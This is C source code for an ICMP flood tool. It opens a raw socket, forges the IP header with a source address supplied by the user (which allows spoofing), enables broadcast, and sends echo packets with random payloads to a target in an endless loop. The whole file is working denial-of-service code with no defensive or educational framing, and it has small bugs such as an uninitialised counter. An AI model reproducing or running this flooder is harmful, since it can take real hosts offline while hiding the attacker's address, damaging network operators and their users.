#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <unistd.h>

typedef unsigned char u8;
typedef unsigned short int u16;

unsigned short in_cksum(unsigned short *ptr, int nbytes);
void help(const char *p);

int main(int argc, char *argv[]){
	if(argc < 3){
		printf("invalid input\n");
		return -1;
	}

	unsigned long daddr;
	unsigned long saddr;
	int payload_size = 0, sent, sent_size;

	saddr = inet_addr(argv[1]);
	daddr = inet_addr(argv[2]);

	if(argc > 3){
		payload_size = atoi(argv[3]);
	}

	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if(sockfd < 0){
		printf("socket open error\n");
	}
	
	int on = 1;

	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (const char *)&on, sizeof(on)) == -1){
		perror("setsockopt");
		return -1;
	}
	if(setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, (const char *)&on, sizeof(on)) == -1){
		perror("setsockopt");
		return -1;
	}
	
	int packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr) + payload_size;
	char *packet = (char *) malloc(packet_size);

	if(!packet){
		perror("out of memory");
		close(sockfd);
		return -1;
	}

	struct iphdr *ip = (struct iphdr *)packet;
	struct icmphdr *icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));
	
	memset (packet, 0, packet_size);
	
	ip->version = 4;
	ip->ihl = 5;
	ip->tos = 0;
	ip->tot_len = htons(packet_size);
	ip->id = rand();
	ip->ttl = 255;
	ip->protocol = IPPROTO_ICMP;
	ip->saddr = saddr;
	ip->daddr = daddr;
	ip->check = 0;

	ip->check = in_cksum((u16 *)ip, sizeof(struct iphdr));

	icmp->type = ICMP_ECHO;
	icmp->code = 0;
	icmp->un.echo.sequence = rand();
	icmp->un.echo.id = rand();
	icmp->checksum = 0;
	
	struct sockaddr_in servaddr;
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = daddr;
	memset(&servaddr.sin_zero, 0, sizeof(servaddr.sin_zero));

	puts("flooding...");

	while(1){
		memset(packet+sizeof(struct iphdr)+sizeof(struct icmphdr), rand() % 255, payload_size);
		icmp->checksum = 0;
		icmp->checksum = in_cksum((unsigned short *)icmp, sizeof(struct icmphdr) + payload_size);

		if((sent_size = sendto(sockfd, packet, packet_size, 0, (struct sockaddr *)&servaddr, sizeof(servaddr))) < 1){
			perror("send failed\n");
			break;
		}
		++sent;
		printf("%d packets sent\r", sent);
		fflush(stdout);

		usleep(10000);
	}
	free(packet);
	close(sockfd);
}

unsigned short in_cksum(unsigned short *ptr, int nbytes){
	register long sum;
	u_short oddbyte;
	register u_short answer;

	sum = 0;
	while(nbytes > 1){
		sum += *ptr++;
		nbytes -= 2;
	}

	if(nbytes == 1){
		oddbyte = 0;
		*((u_char *) &oddbyte) = *(u_char *)ptr;
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;

	return (answer);
}
